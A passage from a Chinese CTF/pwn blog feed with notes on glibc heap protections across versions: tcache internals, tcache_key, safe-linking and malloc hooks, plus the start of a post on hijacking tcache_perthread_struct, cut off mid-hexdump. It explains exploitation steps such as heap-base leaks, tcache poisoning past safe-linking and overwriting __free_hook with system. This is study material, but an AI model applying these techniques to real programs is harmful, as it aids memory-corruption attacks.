        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>记录一下不同版本glibc下的堆管理保护机制的变化(开个坑，以后慢慢记录补充<br></p><p>先贴上几篇参考博客<br></p><p><a href="https://nopnoping.github.io/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">不同版本glibc的堆管理和新增保护机制 - Luexp</a><br><a href="https://jkilopu.github.io/2021/05/12/glibc%E5%90%84%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E4%BF%9D%E6%8A%A4/">glibc各版本的堆保护 | jkilopu’s blog</a><br><a href="https://s0fr.github.io/2020/05/10/libc230/">Glibc中堆管理的变化 | 白里个白</a><br><a href="https://www.cnblogs.com/LynneHuan/p/17822172.html">Glibc高版本堆利用方法总结 - LynneHuan - 博客园</a><br>然后ubuntu和glibc不同版本的对应关系<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ubuntu-libc version</span><br><span class="line"></span><br><span class="line">2.23=“16.04”</span><br><span class="line">2.24=“17.04”</span><br><span class="line">2.26=“17.10”</span><br><span class="line">2.27=“18.04”</span><br><span class="line">2.28=“18.10”</span><br><span class="line">2.29=“19.04”</span><br><span class="line">2.30=“19.10”</span><br><span class="line">2.31=“20.04”</span><br><span class="line">2.32=“20.10”</span><br><span class="line">2.33=“21.04”</span><br><span class="line">2.34=“22.04”</span><br></pre></td></tr></table></figure><h2 id="0x01-关于tcachebins"><a href="#0x01-关于tcachebins" class="headerlink" title="0x01 关于tcachebins"></a>0x01 关于tcachebins</h2><p>在glibc2.26+，引入了tcachebins<br>有两个比较关键的函数<code>tcache_get()</code>和<code>tcache_put()</code>(以下为glibc2.28中的源码)<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个函数会在函数 <code>__int_free</code>和 <code>__libc_malloc</code>的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于0x408并且当给定大小的 tcache bin 未满时调用。一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是7<br>当程序进行 malloc 操作时，会优先检查 tcache 是否有可用的 chunk，如果有，就直接返回。同样，当进行 free 操作时，如果 chunk 的大小符合要求，并且对应的 tcache bin 还未满（默认每个 bin 可以存放 7 个 chunk），就会把 chunk 放入 tcache。否则，会按照原来的流程，放入 unsorted bin 或者其他的 bin 中<br>在 <code>tcache_get</code>中，仅仅检查了 tc_idx，此外，我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的 check，并没有 fastbin 那么复杂，仅仅检查 <code>tcache-&gt;entries[tc_idx] = e-&gt;next</code>.<br>tcachebins并不是由<code>main_arena</code>（位于libc数据段）管理的，而是由<code>tcache_perthread_struct</code>（位于堆段）管理的。具体管理机制见<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/">另一篇博客</a><br></p><h2 id="0x02-tcache-key与safe-linking"><a href="#0x02-tcache-key与safe-linking" class="headerlink" title="0x02 tcache_key与safe-linking"></a>0x02 tcache_key与safe-linking</h2><p>参考博客<br><a href="https://zikh26.github.io/posts/501cca6.html#safe-Linking">Safe-Linking 机制的绕过 | ZIKH26’s Blog</a><br><a href="https://pdf.suer.cc/2024/11/20/tcache%20bin%20%E7%9A%84key%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6/">tcache bin key加密机制</a><br>在glibc2.29+，tcache bin引入了tcache的key加密机制，<code>tcache_entry</code>中新加了一个指针key<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> key;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们看引入了key之后的<code>tcache_put()</code>的部分源码（以下为glibc2.32+）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chunk2mem</code>函数是返回我们free的chunk的实际数据区，也就是去除推头0x10的部分。将其key字段（即fd后的0x8字节）设置为tcache_key。在free一个chunk时候，会检查其key字段的值，如果等于对应tcachebins的<code>tcache_key</code>，说明已经释放过，则会报错中断，如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x29 bytes:</span><br><span class="line">    b&#x27;free(): double free detected in tcache 2\n&#x27;</span><br><span class="line">[DEBUG] Received 0x2b bytes:</span><br><span class="line">    b&#x27;timeout: the monitored command dumped core\n&#x27;</span><br></pre></td></tr></table></figure><p>要绕过这一机制进行double free，需要能够破坏free的chunk的key值即可。<br>至于safe-linking，在glibc2.32+引入，在上面源码就可以看到<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure><p>这一段就是对<code>tcache_entry</code>中的next指针加密。这个宏定义如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure><p>也就是被释放的chunk在<code>tcache-&gt;entry</code>中的next指针值等于被释放的chunk本身的mem地址右移12位再异或上其要指向的chunk（原本tcachebins中的第一个chunk）的mem地址，这一加密结果也会同步到tcachebins中的chunk的fd指针中。我们自己简单验证一下。在glibc2.35版本中我们可以看到如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line">fd: 0x555555559</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559320</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line">fd: 0x55500000c7f9</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555593b0</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line">fd: 0x55500000c669</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559440</span><br><span class="line">Size: 0x20bc0 (with flag bits: 0x20bc1)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x90 [  3]: 0x5555555593c0 —▸ 0x555555559330 —▸ 0x5555555592a0 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; print/x (0x5555555593c0 &gt;&gt; 12) ^ 0x555555559330</span><br><span class="line">$1 = 0x55500000c669</span><br><span class="line">pwndbg&gt; print/x (0x555555559330 &gt;&gt; 12) ^ 0x5555555592a0</span><br><span class="line">$2 = 0x55500000c7f9</span><br><span class="line">pwndbg&gt; print/x (0x5555555592a0 &gt;&gt; 12) ^ 0</span><br><span class="line">$3 = 0x555555559</span><br></pre></td></tr></table></figure><p>这是笔者自己写的先申请三个chunk再先后free的程序的调试结果。可以看到第三个chunk的fd为0x55500000c669，并不是其应该指向的0x555555559330。我们经过safe-linking的加密，(0x5555555593c0 &gt;&gt; 12) ^ 0x555555559330＝0x55500000c669。<br>特别的，对于第一个释放的chunk1，其fd值为0x555555559，因为其在释放时对应的tcachebins为空，其本来应该指向的是0，那么加密之后其实就是其本身mem地址（fd地址）右移12位。在这种情况下，其加密其实并没有达到预期效果，只需左移12位便可以恢复其地址，实现绕过<br>我发现:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  print/x (0x55500000c7f9 ^ 0x5555555592a0) &lt;&lt; 12</span><br><span class="line">$4 = 0x555555559000</span><br><span class="line">pwndbg&gt; print/x (0x55500000c669 ^ 0x555555559330) &lt;&lt; 12</span><br><span class="line">$5 = 0x555555559000</span><br><span class="line">pwndbg&gt; print/x (0x555555559 ^ 0) &lt;&lt; 12</span><br><span class="line">$6 = 0x555555559000</span><br></pre></td></tr></table></figure><p>在同一页内存的chunk，其fd值异或上其指向的真实值再左移12位便得到了heap_base。（堆内存按页分配，heap_base都是0x1000的整数倍）<br>例如在一个存在uaf漏洞的程序中，我们申请一个chunk，然后放入tcachebin中，再访问其fd值，得到的fd值左移12位便是heap_base，其实是heap_base &#x3D;（leak_add ^ 0）&lt;&lt; 12，因为此时对应的tcachebins中只有这一个chunk，其fd指向的真实地址就是0 <br>然后就是关于entries指针数组和对应tcachebins的关系，其实二者指向的是同一块内存，源码中在操作时候对e-&gt;key，e-&gt;next的赋值其实也就是对tcachebins中相应chunk的key字段和fd域的赋值。<br>在safe-linking引入后，<code>tcache_perthread_struct</code>的entries数组中存放的依然是对应tcachebins的第一个chunk的真实的mem地址（也就是fd地址）（索引方式见<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/">我的另一篇博客</a>），所以我们劫持<code>tcache_perthread_struct</code>后仍然可以直接覆盖entries数组的元素为我们的目标地址。<br>然而在safe-linking保护下，我们使用tcache poisoning（类似fastbin attack）修改tcachebins中的chunk的fd域的时候，就需要将目标地址进行加密操作再覆盖。<br>例如我们已经泄露了heap_base，要修改tcachebins中的第一个chunk的fd，便要计算val &#x3D;((heap_base+0x2a0) &gt;&gt; 12) ^ target_add，用这个val来投毒。target_add便是我们想利用tcache poisoning申请的地址，至于heap_base+0x2a0便是我们想要修改fd域的chunk的mem地址（0x290是在glibc2.32+下的tcache_perthread_struct的大小，那么heap+0x290+0x10便是我们申请的第一个chunk的mem地址，也就是此例子中我们要进行投毒的chunk。具体的地址要具体调试分析，此处只是为了方便以申请的第一个chunk为例。）<br>然而在实际上，右移12位后，16进制下地址的后三位都被移出，不会产生影响。也就是说，对和heap_base同一页（单位0x1000）下的chunk进行tcache poisoning时候，只需要直接使用(heap_base&gt;&gt;12)^target_add即可。<br></p><h2 id="0x03-关于hooks"><a href="#0x03-关于hooks" class="headerlink" title="0x03 关于hooks"></a>0x03 关于hooks</h2><p>各种hooks在glibc2.34+都被移除了。在glibc2.34之前的版本中对hooks的劫持时是控制程序执行流的重要方法<br>在malloc.c中可以看到几个全局钩子<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 钩子指针声明 */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span><span class="params">(<span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span> *caller)</span> = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__realloc_hook)</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span> *caller)</span> = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__memalign_hook)</span><span class="params">(<span class="type">size_t</span> alignment, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span> *caller)</span> = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">const</span> <span class="type">void</span> *caller)</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化钩子 */</span></span><br><span class="line"><span class="type">void</span> (*weak_variable __malloc_initialize_hook)(<span class="type">void</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这几个钩子也正是pwn中劫持的重点关照对象。这几个hook大多都能在libc中直接查到偏移位置。（例如<code>libc.sym[&#39;__free_hook&#39;]</code>）<br>关于钩子的触发，以<code>__malloc_hook</code>为例，源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__libc_malloc(<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  <span class="comment">// [1] 钩子检查</span></span><br><span class="line">  <span class="type">void</span> *(*hook)(<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>)); <span class="comment">// 触发钩子调用</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// [2] 常规分配流程</span></span><br><span class="line">  <span class="type">void</span> *result = _int_malloc(&amp;main_arena, bytes);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// [3] 分配失败处理</span></span><br><span class="line">  <span class="keyword">return</span> malloc_check(result, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行<code>__libc_malloc</code>函数时候会先检查<code>__malloc_hook</code>，如果钩子非空，则直接执行指向的函数（或被篡改的可执行的地址）。其他几个全局钩子也是类似的，调用对应的函数时候，都会先检查对应的hook，不空则直接执行。<br>比如打<code>__free_hook</code>，改为system函数然后在chunk中写入<code>&#39;/bin/sh\x00&#39;</code>,直接free对应chunk即可。我们看源码<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void __libc_free(void *mem) &#123;</span><br><span class="line">  // 钩子检查</span><br><span class="line">  void (*hook)(void *, const void *) = atomic_forced_read(__free_hook);</span><br><span class="line">  if (__builtin_expect(hook != NULL, 0)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(0));</span><br><span class="line">    return; // 跳过后续释放逻辑</span><br><span class="line">  &#125;</span><br><span class="line">  // 正常释放流程</span><br><span class="line">  _int_free(&amp;main_arena, mem, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为<code>__free_hook</code>函数会以传入<code>__libc_free</code>的对应chunk的mem地址为参数。而打<code>__malloc_hook</code>时候则更多需要one_gadget的辅助了<br>glibc2.34+各类hooks被移除，因此也需要掌握其他方法.<br></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持tcache_perthread_struct</title>
      <link href="/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/"/>
      <url>/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-关于tcache-perthread-struct"><a href="#0x00-关于tcache-perthread-struct" class="headerlink" title="0x00 关于tcache_perthread_struct"></a>0x00 关于tcache_perthread_struct</h2><p>tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能，与 fastbin 类似。 tcache 引入了两个新的结构体，<code>tcache_entry</code>和 <code>tcache_perthread_struct</code> 。<br>两个结构体源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//0x40</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TCACHE_MAX_BINS:</span><br><span class="line"># define TCACHE_MAX_BINS        64</span><br></pre></td></tr></table></figure><p>我们在引入了tcache的glibc版本中，申请第一块chunk时查看heap状态会发现多申请了一块大小0x250的chunk（glibc2.32+为0x290，因为<code>counts</code>的类型从char变成了uint16_t）。这个chunk就是 <code>tcache_perthread_struct</code><br>counts数组存储的是各个size的tcache bin中的chunk数量，而entries指针数组则存放着各个size的tcache bin中的第一个chunk的mem地址(fd地址而非堆头地址)<br>我们通过调试SWPUCTF_2019_p1KkHeap这道题目的程序来使其直观化<br>我们先申请了size为0x80，0x90，0xa0的三个chunk，查看heap如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01000</span><br><span class="line">Size: 0x250 (with flag bits: 0x251)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01250</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a012e0</span><br><span class="line">Size: 0xa0 (with flag bits: 0xa1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01380</span><br><span class="line">Size: 0xb0 (with flag bits: 0xb1)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01430</span><br><span class="line">Size: 0x20bd0 (with flag bits: 0x20bd1)</span><br></pre></td></tr></table></figure><p>发现除了我们申请的三个chunk，还有一个size为0x250的chunk，正是 <code>tcache_perthread_struct</code>。然后我们free申请的三个chunk<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01000</span><br><span class="line">Size: 0x250 (with flag bits: 0x251)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01250</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555a012e0</span><br><span class="line">Size: 0xa0 (with flag bits: 0xa1)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01380</span><br><span class="line">Size: 0xb0 (with flag bits: 0xb1)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01430</span><br><span class="line">Size: 0x20bd0 (with flag bits: 0x20bd1)</span><br></pre></td></tr></table></figure><p>注意这里显示的chunk地址是从堆头开始计的，也就是包括了pre_size域和size域。此时查看bins<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: 0x555555a01260 ◂— 0</span><br><span class="line">0xa0 [  1]: 0x555555a012f0 ◂— 0</span><br><span class="line">0xb0 [  1]: 0x555555a01390 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>注意bins中的chunk地址是从fd开始计的<br>三个chunk已经加入了tcachebins（大小为0x20到0x410),我们查看 tcache_perthread_struct<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80gx 0x555555a01000</span><br><span class="line">0x555555a01000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x555555a01010: 0x0100000000000000      0x0000000000000101</span><br><span class="line">0x555555a01020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01080: 0x0000000000000000      0x0000555555a01260</span><br><span class="line">0x555555a01090: 0x0000555555a012f0      0x0000555555a01390</span><br><span class="line">0x555555a010a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01170: 0x0000000000000000      0x0000000000000000</span><br><span 